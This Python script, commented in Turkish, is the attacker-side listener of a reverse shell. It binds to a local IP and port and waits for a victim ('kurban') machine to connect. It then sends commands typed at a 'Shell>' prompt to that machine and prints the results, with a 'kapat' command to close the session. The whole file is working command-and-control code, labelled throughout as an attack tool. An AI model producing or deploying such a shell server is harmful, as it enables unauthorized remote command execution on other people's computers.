import socket

def sunucu():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#paranteziçi(ipv4,tcp)  anlamına gelir.nesne tanımlamış olduk.
    s.bind(("192.168.0.103", 8080)) #Saldırgan üzerinde dinlenecek ip port bilgisini giriyoruz.
    s.listen(1)#1 kişinin bağlanacağını belirtiliyor.
    baglanti, adres = s.accept()  #Bağlantı kabul etmek için accept çağırıldı.iki liste elemanı döndürür.
    print("{} adresi üzerinden bağlantı kuruldu...".format(adres))#Server'a bağlanan kişinin ip bilgisin ekrana yansıtıyor.
    while True:
        komut=input("Shell> ")#Kurban üzerinde çalıştırılacak komut alınıyor.
        if 'kapat' in komut:#Eğer saldırgan kapat komut bilgisini girdiyse bağlantı sonlandırılıyor.
            baglanti.send('kapat'.encode())
            baglanti.close()
            break
        else:#Bu aşamada saldırgan kurban kişiye istediği komutu gönderiyor ve karşılığında dönen cevap ekrana yazdırılıyor.
            baglanti.send(komut.encode())
            print(baglanti.recv(1024).decode())
def main():
    sunucu()
if __name__ == '__main__':
    main()